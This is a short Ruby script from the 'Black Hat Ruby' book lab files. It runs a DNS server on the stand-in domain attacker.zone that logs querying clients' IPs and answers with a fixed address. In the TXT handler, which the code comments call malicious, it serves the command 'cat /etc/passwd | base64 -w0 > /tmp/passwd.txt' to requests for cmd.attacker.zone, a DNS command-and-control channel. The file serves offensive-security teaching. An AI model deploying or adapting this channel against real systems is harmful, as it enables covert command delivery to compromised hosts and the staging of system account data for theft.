#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Pure Ruby DNS Server
# Requirements:
#   gem install rubydns
# 
require 'rubydns'

INTERFACES = [
	[:udp, "0.0.0.0", 5300],
	[:tcp, "0.0.0.0", 5300],
]

IN   = Resolv::DNS::Resource::IN

# Use upstream DNS for name resolution.
UPSTREAM = RubyDNS::Resolver.new([[:udp, "8.8.8.8", 5353], [:tcp, "8.8.8.8", 5353]])

puts "[+] Running DNS Server"
# Start the RubyDNS server
RubyDNS.run_server(INTERFACES) do
  
  # Match A queries for attacker.zone and its subdomains
  match(%r{attacker.zone}, IN::A) do |transaction|
    ip_addr  = transaction.options[:remote_address].ip_address                # Get client's IP address
    question = transaction.question                                           # Get requested domain 
    puts "[+] #{ip_addr} => #{question.to_s}"
		transaction.respond!("99.11.99.11")                                       # Response with an IP address
	end

  # Match TXT queries for cmd.attacker.zone domain
  match(/cmd.attacker.zone/, IN::TXT) do |transaction|
    transaction.respond!("cat /etc/passwd | base64 -w0 > /tmp/passwd.txt")    # Response with string. In our case, malicious string
  end

  # Default DNS handle
  otherwise do |transaction|
		transaction.passthrough!(UPSTREAM)
  end

end


